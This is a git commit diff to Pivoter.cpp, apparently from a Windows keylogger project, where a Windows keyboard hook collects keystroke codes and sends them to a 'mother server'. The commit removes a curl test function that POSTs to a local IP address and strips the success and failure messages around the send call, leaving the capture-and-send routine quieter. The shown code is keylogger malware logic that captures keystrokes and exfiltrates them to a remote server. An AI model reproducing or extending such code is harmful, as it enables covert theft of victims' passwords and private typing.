0b54840c5fc97bf58b9434e3e3d11869ad78a306
osamu-kj <kevin.jerebica@gmail.com>
2022-12-15 16:24:45 +0100

    General: Remove unnecessary function

--- Pivoter.cpp
+++ Pivoter.cpp
@@ -23,11 +23,7 @@ void stack_codes() {
 		return; 
 	
 	// send the codes to the mother server 
-	if (mother_server_pv.send_codes(virt_codes))
-		std::cout << "the transfer was successful.." << std::endl;
-	else
-		std::cout << "the transfer failed.." << std::endl; 
-	
+	mother_server_pv.send_codes(virt_codes); 
 	virt_codes.clear();
 }
 
@@ -46,36 +42,6 @@ LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
 		stack_codes();
 	}
 	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
-}
-
-void test_function() {
-	CURL* curl;
-	CURLcode res;
-
-	/* In windows, this will init the winsock stuff */
-	curl_global_init(CURL_GLOBAL_ALL);
-
-	/* get a curl handle */
-	curl = curl_easy_init();
-	if (curl) {
-		/* First set the URL that is about to receive our POST. This URL can
-		   just as well be an https:// URL if that is what should receive the
-		   data. */
-		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.108:443/test");
-		/* Now specify the POST data */
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
-
-		/* Perform the request, res will get the return code */
-		res = curl_easy_perform(curl);
-		/* Check for errors */
-		if (res != CURLE_OK)
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",
-				curl_easy_strerror(res));
-
-		/* always cleanup */
-		curl_easy_cleanup(curl);
-	}
-	curl_global_cleanup();
 }
 
 int main() {
